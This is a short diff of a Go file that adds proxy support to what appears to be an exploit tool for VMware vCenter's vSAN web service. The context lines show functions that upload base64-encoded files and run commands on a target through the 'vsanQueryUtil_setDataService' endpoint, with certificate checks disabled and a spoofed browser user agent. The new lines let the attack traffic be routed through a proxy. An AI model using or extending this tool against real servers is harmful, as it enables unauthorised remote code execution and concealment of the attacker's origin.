@@ -15,6 +15,7 @@ import (
 )
 
 var user_agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36 Edg/80.0.361.54"
+var Proxy_server = ""
 
 func To_b64(file_byte []byte) string {
 	// fmt.Println(base64.StdEncoding.EncodeToString(file_byte))
@@ -35,6 +36,7 @@ func Upload(url, b64_str string) {
 	client.EnableForceHTTP1()
 	client.SetTimeout(3 * time.Second)
 	client.DisableKeepAlives()
+	client.SetProxyURL(Proxy_server)
 	client.SetUserAgent(user_agent)
 	resp, err := client.R().SetContentType("application/json").SetBodyString(jsonText).Post(tarGet)
 	if err != nil {
@@ -65,6 +67,7 @@ func Execute(url string) {
 	client.SetTimeout(3 * time.Second)
 	client.SetUserAgent(user_agent)
 	client.DisableKeepAlives()
+	client.SetProxyURL(Proxy_server)
 	resp, err := client.R().SetContentType("application/json").SetBody(jsonText).Post(tarGet)
 	if err != nil {
 		fmt.Println("[-] Command execution failed, Please check network.")
@@ -143,6 +146,7 @@ func send(url, uri, json_body string) {
 	client := req.C()
 	client.EnableInsecureSkipVerify()
 	client.EnableForceHTTP1()
+	client.SetProxyURL(Proxy_server)
 	base := "/ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService"
 	resp, err := client.R().SetBodyJsonString(json_body).Post(url + base + uri)
 	if err != nil {
